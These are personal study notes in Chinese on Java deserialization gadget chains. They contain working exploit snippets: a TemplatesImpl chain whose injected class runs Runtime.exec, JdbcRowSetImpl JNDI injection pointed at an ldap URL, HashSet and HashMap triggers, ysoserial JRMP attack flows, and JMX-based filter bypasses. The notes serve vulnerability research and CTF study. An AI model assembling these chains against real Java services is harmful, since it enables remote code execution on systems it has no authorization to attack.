# java gadget

> 介绍的java gadget都是自己分析组件遇到的。。

## 简单介绍
反序列化过程==将字节流还原成对象实例的过程

反序列化过程==创建空对象+设置对象属性的过程（readObject()函数负责）

反序列化过程==**类的加载+创建对象+调用readObject**

hint:

Externalizable接口是serializable子类。其中有readExternal方法和writeExternal方法。

实现了Externalizable接口，在其反序列化的时候会触发readExternal。


## 思路
Java序列化 基本上找readobject 然后看里面的方法和我们可以控制的参数基本上参数是通过构造方法获得的，然后利用方法去触发下一个方法。或者是利用代理触发invoke方法需要满足代码东西实现invokeHaeder方法。

## readobject

```java
java.beans.PropertyChangeSupport#put->AnnotationInvocationHandler
AnnotationInvocationHandler
HashMap#hashCode
PriorityQueue
Hashtable
HashSet  
BadAttributeValueExpException

C3P0
PoolBackedDataSourceBase

Vaadin
NestedMethodProperty

FileUpload
DiskFileItem
```

## invoke代理

```
AnnotationInvocationHandler
AnnotationInvocationHandler#equalsImpl
```

## 危险类

```
InvokerTransformer#transform
InstantiateTransformer#transform
BeanComparator#compare
PropertyUtils.getProperty(new CBtest(),"name");//调用get方法 getName
```

TemplatesImpl

```java
我们从TransletClassLoader#defineClass()向前追溯一下调用链：

TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass()

追到最前面两个方法TemplatesImpl#getOutputProperties()、TemplatesImpl#newTransformer()，这两者的作用域是public，可以被外部调用。我们尝试用newTransformer()构造一个简单的POC...
    

#无参数的invoke
ReflectionUtils.invokeMethod(newTransformer, TemplatesImpl);

TemplatesImpl.getOutputProperties()
  TemplatesImpl.newTransformer()
  	TemplatesImpl.getTransletInstance()
  		TemplatesImpl.defineTransletClasses()
  			TransletClassLoader.defineClass()
  			
        
利用代码
ClassPool pool = ClassPool.getDefault();
pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
CtClass cc = pool.makeClass("Cat");
String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
cc.makeClassInitializer().insertBefore(cmd);
String randomClassName = "EvilCat" + System.nanoTime();
cc.setName(randomClassName);
cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); 
byte[] classBytes = cc.toBytecode();
byte[][] targetByteCodes = new byte[][]{classBytes};
TemplatesImpl templates = TemplatesImpl.class.newInstance();
setFieldValue(templates, "_bytecodes", targetByteCodes);
setFieldValue(templates, "_name", "name");
setFieldValue(templates, "_class", null);
ObjectBean objectBean = new ObjectBean(Templates.class,templates);

public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
    final Field field = getField(obj.getClass(), fieldName);
    field.setAccessible(true);
    field.set(obj, value);
}
public static Field getField(final Class<?> clazz, final String fieldName) {
    Field field = null;
    try {
        field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
    }
    catch (NoSuchFieldException ex) {
        if (clazz.getSuperclass() != null)
            field = getField(clazz.getSuperclass(), fieldName);
    }
    return field;
}
```

AnnotationInvocationHandler

```java
ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				AnnotationInvocationHandler.invoke() (Proxy)
 							invoke

 
entrySet
AnnotationInvocationHandler 反序列化时调用 memberValues 中存放对象的 entrySet 对象

Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor<?> constructor = c.getDeclaredConstructors()[0];
constructor.setAccessible(true);
// 创建 ConvertedClosure 的动态代理类实例
Map handler = (Map) Proxy.newProxyInstance(Class.class.getClassLoader(), new Class[]{Map.class}, closure);
// 使用动态代理初始化 AnnotationInvocationHandler
InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, handler);
```

JdbcRowSetImpl

```java
可以jndi注入

JdbcRowSetImpl rs = new JdbcRowSetImpl();
rs.setDataSourceName("ldap://127.0.0.1:2333/test");
Method method = JdbcRowSetImpl.class.getDeclaredMethod("getDatabaseMetaData");

jndi注入利用流程
1.当客户端程序中调用了InitialContext.lookup(url),并且url可以被输入控制指向精心构造好的rmi服务地址/ldap服务
2.恶意的rmi服务会向受攻击的客户端返回一个Refernce,用于获取恶意的Factory类
3.当客户端执行了lookup()时，会对恶意的Factory类进行加载并实例化，通过factory.getObjectInstance()获取外部远程对象实例
4.攻击者在Factory类文件的构造方法，静态代码块，getObjectInstance()方法等处写入恶意代码，达到远程代码执行效果。
```

HashMap

```
HashMap<Object, Object> map = new HashMap<>();
map.put(expression, "");
map.put("", "");

// 先放入带有无害的 ValueExpression，put 到 map 之后再反射写入 valueExpression 字段避免触发
Field field1 = expression.getClass().getDeclaredField("valueExpression");
field1.setAccessible(true);
field1.set(expression, valueExpression);
```

HashSet

cc11中
```
 * java.util.HashSet.readObject()
 *   java.util.HashMap.put()
 *   java.util.HashMap.hash()
//触发hashset
HashSet hashset = new HashSet(1);
hashset.add("foo");
Field f = null;
try {
    f = HashSet.class.getDeclaredField("map");
} catch (NoSuchFieldException e) {
    f = HashSet.class.getDeclaredField("backingMap");
}
f.setAccessible(true);
HashMap hashset_map = (HashMap) f.get(hashset);

Field f2 = null;
try {
    f2 = HashMap.class.getDeclaredField("table");
} catch (NoSuchFieldException e) {
    f2 = HashMap.class.getDeclaredField("elementData");
}

f2.setAccessible(true);
Object[] array = (Object[])f2.get(hashset_map);

Object node = array[0];
if(node == null){
    node = array[1];
}
Field keyField = null;
try{
    keyField = node.getClass().getDeclaredField("key");
}catch(Exception e){
    keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
}
keyField.setAccessible(true);
keyField.set(node,evil);
```
    
```
HashSet hashSet = new HashSet(1);
hashSet.add(entry);
```

BadAttributeValueExpException 触发toString
```
BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("");
Field valField = BadAttributeValueExpException.class.getDeclaredField("val");
valField.setAccessible(true);
valField.set(badAttributeValueExpException,xxxxx);
```


## 写文件

aspectjweaver组件

```
SimpleCache#put
```

## class.forname

这里我们使用com.sun.org.apache.bcel.internal.util.ClassLoader这个动态加载器。这个classloader允许传入经过BCEL编码的字节码内容(className),所以我们对恶意类的字节码进行BCEL编码,赋给className,classloader指定为这个加载器，调用class.forname(className, true, classloader)就会加载恶意类的静态代码块中的代码

## java内省

```
getReadMethod()，获得用于读取属性值的方法；getWriteMethod()，获得用于写入属性值的方法;

简单的说安全问题就是可以调用set和get方法

com.sun.syndication.feed.impl#ToStringBean
PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass);
 Method pReadMethod = pds[i].getReadMethod();
 Object value = pReadMethod.invoke(this._obj, NO_PARAMS);
```
### ysoserial exploit/JRMPClient

```
1、exploit/JRMPClient与exploit/RMIRegistryExploit类似，可以攻击任何RMIServer，但exploit/JRMPClient是通过dgc通信进行攻击，
而exploit/RMIRegistryExploit是通过bind方法绑定恶意payload进行攻击。

2、exploit/JRMPClient可以结合payloads/JRMPListener进行攻击，但exploit/RMIRegistryExploit不能结合payloads/JRMPListener进行攻击

3、JEP 290之后，对RMI注册表和分布式垃圾收集（DGC）新增了内置过滤器，以上攻击方式均失效了。
```
###  ysoserial exploit/JRMPListener

```
1、攻击方在自己的服务器使用exploit/JRMPListener开启一个rmi监听

2、往存在漏洞的服务器发送payloads/JRMPClient，payload中已经设置了攻击者服务器ip及JRMPListener监听的端口，
漏洞服务器反序列化该payload后，会去连接攻击者开启的rmi监听，在通信过程中，攻击者服务器会发送一个可执行命令的payload
（假如存在漏洞的服务器中有使用org.apacje.commons.collections包，则可以发送CommonsCollections系列的payload），从而达到命令执行的结果。
```

### 绕过 resolveClass方法的this.classLoader.loadClass
参考tctf finaly buggyloadercode

```java
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        Class clazz = this.classLoader.loadClass(desc.getName());
        return clazz;
        //return super.resolveClass(desc);
    }
    
------------
1. 通过jrmp去打 要求出网
2. 通过jmx去打
poc配合cc11

JMXServiceURL jurl = new JMXServiceURL("service:jmx:rmi:///stub/" + Temp.getExp());//jmx协议
Map hashMapp = new HashMap();
RMIConnector rc = new RMIConnector(jurl,hashMapp);

String finalExp = "service:jmx:rmi:///stub/" + Temp.getExp();//jmx协议
RMIConnector rmiConnector = new RMIConnector(new JMXServiceURL(finalExp), new HashMap<>());//jmx连接

```
### 绕过

>https://forum.butian.net/share/125

>https://mp.weixin.qq.com/s/OxeYufM-ZX_SdbV5zjWV7A

com.sun.org.apache.xalan.internal.xsltc.trax用java.rmi.MarshalledObject代替。

相当于二次反序列化。
